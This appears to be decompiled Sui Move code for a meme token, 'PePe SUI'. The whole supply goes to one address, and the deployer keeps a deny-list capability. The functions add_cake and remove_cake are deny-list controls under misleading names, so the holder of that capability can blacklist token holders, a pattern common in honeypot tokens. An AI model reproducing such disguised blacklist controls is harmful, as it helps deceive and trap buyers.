module 0x1beaf2a5939b9e41f4acf60ebd0a9db552930e7c0824a4451c29b8c2c5298a00::pepe {
    struct PEPE has drop {
        dummy_field: bool,
    }

    public fun add_cake(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PEPE>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_add<PEPE>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    public fun check_cake<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : bool {
        0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1)
    }

    fun init(arg0: PEPE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PEPE>(arg0, 9, b"PEPESUI", b"PePe SUI", b"just a viral lil hippo", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://pink-naval-kingfisher-12.mypinata.cloud/ipfs/QmNRWbrAB3qXjjLX5h1MVL3hQN5aa2ruiyeDd8nBzo1Vjd"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PEPE>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PEPE>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<PEPE>(&mut v3, 1000000000000000000, @0xc9e0b5c92fd7839316afc9e66ea7c5f9672d838fedf14283e8ee38f7e67a4f06, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PEPE>>(v3);
    }

    public fun remove_cake(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PEPE>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_remove<PEPE>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    // decompiled from Move bytecode v6
}

